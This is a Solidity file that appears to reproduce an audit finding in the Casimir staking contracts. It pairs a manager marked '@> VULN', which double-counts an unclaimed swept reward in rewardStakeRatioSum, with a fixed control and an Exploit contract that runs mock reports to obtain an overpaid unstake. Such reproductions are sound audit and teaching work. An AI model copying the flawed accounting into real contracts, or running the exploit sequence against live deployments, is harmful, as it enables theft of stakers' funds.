// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Casimir — rewardStakeRatioSum counts an unclaimed delayed balance twice
    (Cyfrin, finding 35003).
    SYNTHETIC, cheatcode-free. The ratio update is the audited accounting.
    Root cause: finalizeReport subtracts an unclaimed swept reward out of
    latestActiveRewards. The next report sees the same EigenPod balance as a
    new reward and increases rewardStakeRatioSum again. A 32 ETH stake then
    unstakes 32.2003125 ETH instead of the fair 32.1 ETH.
    The control leaves latestActiveRewards equal to the unclaimed reward, so
    the second report does not move the ratio. */

contract StakeToken {
    string public constant name = "Casimir stake";
    string public constant symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CasimirManager {
    uint256 public constant PRINCIPAL = 32 ether;
    uint256 public constant GROSS_REWARD = 105 * 1e15;

    StakeToken public token;
    uint256 public latestActiveBalanceAfterFee;
    uint256 public latestActiveRewards;
    uint256 public rewardStakeRatioSum;
    uint256 public reportSweptBalance;
    uint256 public reportActiveBalance;
    uint256 public userShares;

    constructor(StakeToken token_) {
        token = token_;
    }

    function openStake() external {
        latestActiveBalanceAfterFee = PRINCIPAL;
        latestActiveRewards = 0;
        rewardStakeRatioSum = 1e18;
        userShares = PRINCIPAL;
    }

    function startReport(uint256 swept) external {
        reportSweptBalance = swept;
    }

    function syncValidators(uint256 activeBalance) external {
        reportActiveBalance = activeBalance;
    }

    function finalizeReport() external {
        uint256 rewards = reportSweptBalance + reportActiveBalance - PRINCIPAL;
        if (rewards > latestActiveRewards) {
            uint256 change = rewards - latestActiveRewards;
            uint256 gainAfterFee = change * 20 / 21;
            uint256 bump = rewardStakeRatioSum * gainAfterFee / latestActiveBalanceAfterFee;
            // @> VULN: an unclaimed delayed balance is added into rewardStakeRatioSum again
            rewardStakeRatioSum = rewardStakeRatioSum + bump;
            latestActiveBalanceAfterFee += gainAfterFee;
        }
        if (reportSweptBalance > 0) {
            uint256 sweptAfterFee = reportSweptBalance * 20 / 21;
            latestActiveBalanceAfterFee -= sweptAfterFee;
        }
        latestActiveRewards = rewards - reportSweptBalance;
    }

    function previewUnstake(uint256 shares) public view returns (uint256) {
        return shares * rewardStakeRatioSum / 1e18;
    }

    function fairPayout(uint256 shares) public pure returns (uint256) {
        uint256 ratio = 1e18 + (1e18 * 0.1 ether) / PRINCIPAL;
        return shares * ratio / 1e18;
    }

    function unstake(address to) external returns (uint256 paid) {
        paid = userShares * rewardStakeRatioSum / 1e18;
        token.transfer(to, paid);
    }
}

/// Same reports, but latestActiveRewards keeps the unclaimed swept reward.
contract CasimirManagerFixed {
    uint256 public constant PRINCIPAL = 32 ether;

    uint256 public latestActiveBalanceAfterFee;
    uint256 public latestActiveRewards;
    uint256 public rewardStakeRatioSum;
    uint256 public reportSweptBalance;
    uint256 public reportActiveBalance;

    function openStake() external {
        latestActiveBalanceAfterFee = PRINCIPAL;
        latestActiveRewards = 0;
        rewardStakeRatioSum = 1e18;
    }

    function startReport(uint256 swept) external {
        reportSweptBalance = swept;
    }

    function syncValidators(uint256 activeBalance) external {
        reportActiveBalance = activeBalance;
    }

    function finalizeReport() external {
        uint256 rewards = reportSweptBalance + reportActiveBalance - PRINCIPAL;
        if (rewards > latestActiveRewards) {
            uint256 change = rewards - latestActiveRewards;
            uint256 gainAfterFee = change * 20 / 21;
            uint256 bump = rewardStakeRatioSum * gainAfterFee / latestActiveBalanceAfterFee;
            rewardStakeRatioSum = rewardStakeRatioSum + bump;
            latestActiveBalanceAfterFee += gainAfterFee;
        }
        if (reportSweptBalance > 0) {
            uint256 sweptAfterFee = reportSweptBalance * 20 / 21;
            latestActiveBalanceAfterFee -= sweptAfterFee;
        }
        latestActiveRewards = rewards;
    }

    function previewUnstake(uint256 shares) public view returns (uint256) {
        return shares * rewardStakeRatioSum / 1e18;
    }
}

contract Exploit {
    uint256 public constant PAID = 32200312500000000000;
    uint256 public constant FAIR = 32100000000000000000;
    uint256 public constant EXTRA = 100312500000000000;

    StakeToken public token; // nonce 1
    CasimirManager public manager; // nonce 2

    uint256 public paid;
    uint256 public fair;

    constructor() {
        token = new StakeToken();
        manager = new CasimirManager(token);
        token.mint(address(manager), 33 ether);
    }

    function run() external {
        manager.openStake();
        manager.startReport(0);
        manager.syncValidators(32 ether + 105 * 1e15);
        manager.finalizeReport();
        manager.startReport(105 * 1e15);
        manager.syncValidators(32 ether);
        manager.finalizeReport();
        manager.startReport(105 * 1e15);
        manager.syncValidators(32 ether);
        manager.finalizeReport();
        paid = manager.previewUnstake(32 ether);
        fair = manager.fairPayout(32 ether);
        manager.unstake(address(this));
        require(paid == PAID, "paid");
        require(fair == FAIR, "fair");
        require(paid > fair, "not above fair");
        require(paid - fair == EXTRA, "overpay");
        require(token.balanceOf(address(this)) == PAID, "payout");
    }
}
